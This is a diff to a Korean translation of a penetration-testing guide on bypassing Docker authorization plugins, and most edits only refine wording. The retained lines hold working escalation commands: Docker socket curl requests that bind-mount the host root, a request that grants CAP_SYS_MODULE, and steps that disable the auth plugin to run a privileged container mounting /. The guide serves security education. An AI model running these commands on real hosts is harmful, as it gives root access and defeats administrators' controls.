@@ -48,7 +48,7 @@ Docker 데몬 **시작**의 일환으로 **플러그인**을 **등록**하는 �
 
 확인해야 할 주요 사항은 **어떤 엔드포인트가 허용되는지**와 **어떤 HostConfig 값이 허용되는지**입니다.
 
-이 열거를 수행하기 위해 **도구** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**를 사용할 수 있습니다.**
+이 열거를 수행하기 위해 **도구** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**를** 사용할 수 있습니다.
 
 ## 허용되지 않는 `run --privileged`
 
@@ -58,7 +58,7 @@ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubunt
 ```
 ### 컨테이너 실행 후 특권 세션 얻기
 
-이 경우 sysadmin은 **사용자가 볼륨을 마운트하고 `--privileged` 플래그로 컨테이너를 실행하는 것을 금지했거나** 컨테이너에 추가 권한을 부여하는 것을 금지했습니다:**
+이 경우 sysadmin은 **사용자가 볼륨을 마운트하고 `--privileged` 플래그로 컨테이너를 실행하는 것을 금지**하거나 컨테이너에 추가 권한을 부여하는 것을 금지했습니다:
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
@@ -134,13 +134,13 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ### HostConfig의 마운트
 
-**root의 Binds**와 동일한 지침을 따르며 Docker API에 이 **요청**을 수행합니다:
+**root의 바인드**와 동일한 지침을 따르며 Docker API에 이 **요청**을 수행합니다:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
-## Unchecked JSON Attribute
+## 확인되지 않은 JSON 속성
 
-시스템 관리자가 도커 방화벽을 구성할 때 **"HostConfig"** 내의 **"Capabilities"**와 같은 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 매개변수의 중요한 속성을 **잊었을 가능성**이 있습니다. 다음 예제에서는 이 잘못된 구성을 악용하여 **SYS_MODULE** 권한을 가진 컨테이너를 생성하고 실행할 수 있습니다:
+시스템 관리자가 도커 방화벽을 구성할 때 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)의 "**HostConfig**" 내의 "**Capabilities**"와 같은 매개변수의 **중요한 속성을 잊었을 가능성이 있습니다**. 다음 예제에서는 이 잘못된 구성을 악용하여 **SYS_MODULE** 권한을 가진 컨테이너를 생성하고 실행할 수 있습니다:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -155,7 +155,7 @@ capsh --print
 
 ## 플러그인 비활성화
 
-**sysadmin**이 **플러그인**을 **비활성화**할 수 있는 능력을 **금지하는** 것을 **잊었다면**, 이를 이용하여 완전히 비활성화할 수 있습니다!
+**sysadmin**이 **플러그인**을 **비활성화**할 수 있는 능력을 **금지**하는 것을 **잊었다면**, 이를 이용하여 완전히 비활성화할 수 있습니다!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -167,7 +167,7 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
-플러그인을 **승격 후 다시 활성화하는 것을 잊지 마세요**, 그렇지 않으면 **docker 서비스가 재시작되지 않습니다**!
+플러그인을 **권한 상승 후 다시 활성화하는 것을 잊지 마세요**, 그렇지 않으면 **docker 서비스의 재시작이 작동하지 않습니다**!
 
 ## Auth Plugin Bypass 작성물
 
